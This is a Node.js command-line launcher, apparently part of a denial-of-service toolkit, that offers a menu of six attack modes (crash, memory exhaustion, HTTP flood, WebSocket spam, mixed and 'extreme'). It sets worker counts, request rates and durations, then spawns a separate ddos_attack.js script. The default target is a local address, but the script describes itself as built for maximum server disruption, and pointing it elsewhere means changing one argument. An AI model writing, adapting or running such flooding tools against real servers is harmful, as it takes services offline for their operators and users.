#!/usr/bin/env node

/**
 * Enhanced DDoS Attack Launcher
 * Multiple attack vectors for maximum server disruption
 */

import { spawn } from 'child_process'
import { fileURLToPath } from 'url'
import { dirname, join } from 'path'

const __dirname = dirname(fileURLToPath(import.meta.url))

console.log('💥 Enhanced DDoS Attack Suite')
console.log('═════════════════════════════')
console.log('Select attack type:')
console.log('1. 🔥 CRASH - Maximum power (WILL crash server)')
console.log('2. 💣 MEMORY - Memory exhaustion attack')
console.log('3. 🌊 FLOOD - HTTP request flood')
console.log('4. ⚡ SOCKET - WebSocket connection spam')
console.log('5. 🎯 MIXED - Combined attack vectors')
console.log('6. 💀 EXTREME - Nuclear option (USE WITH CAUTION)')
console.log('')

process.stdout.write('Enter choice (1-6): ')

process.stdin.setEncoding('utf8')
process.stdin.on('readable', () => {
    const chunk = process.stdin.read()
    if (chunk !== null) {
        const choice = chunk.trim()
        launchAttack(choice)
    }
})

function launchAttack(choice) {
    let attackType, workers, rps, duration
    
    switch (choice) {
        case '1':
            console.log('🔥 Launching CRASH attack...')
            attackType = 'crash'
            workers = 16
            rps = 2000
            duration = 120
            break
        case '2':
            console.log('💣 Launching MEMORY attack...')
            attackType = 'memory'
            workers = 8
            rps = 150
            duration = 90
            break
        case '3':
            console.log('🌊 Launching FLOOD attack...')
            attackType = 'http'
            workers = 12
            rps = 1500
            duration = 60
            break
        case '4':
            console.log('⚡ Launching SOCKET attack...')
            attackType = 'socket'
            workers = 10
            rps = 800
            duration = 75
            break
        case '5':
            console.log('🎯 Launching MIXED attack...')
            attackType = 'mixed'
            workers = 12
            rps = 1000
            duration = 90
            break
        case '6':
            console.log('💀 Launching EXTREME attack...')
            console.log('⚠️  WARNING: This WILL overwhelm the server!')
            attackType = 'crash'
            workers = 24
            rps = 5000
            duration = 180
            break
        default:
            console.log('❌ Invalid choice. Exiting...')
            process.exit(1)
    }
    
    const args = [
        join(__dirname, 'ddos_attack.js'),
        '--target', 'http://127.0.0.1:3000',
        '--type', attackType,
        '--workers', workers.toString(),
        '--rps', rps.toString(),
        '--duration', duration.toString()
    ]
    
    console.log(`🚀 Starting attack with ${workers} workers, ${rps} RPS for ${duration}s...`)
    console.log('Press Ctrl+C to stop\n')
    
    const attack = spawn('node', args, {
        stdio: 'inherit',
        cwd: __dirname
    })
    
    attack.on('close', (code) => {
        console.log(`\n🏁 Attack finished with code ${code}`)
        process.exit(code)
    })
    
    // Handle Ctrl+C
    process.on('SIGINT', () => {
        console.log('\n⏹️  Stopping attack...')
        attack.kill('SIGINT')
    })
}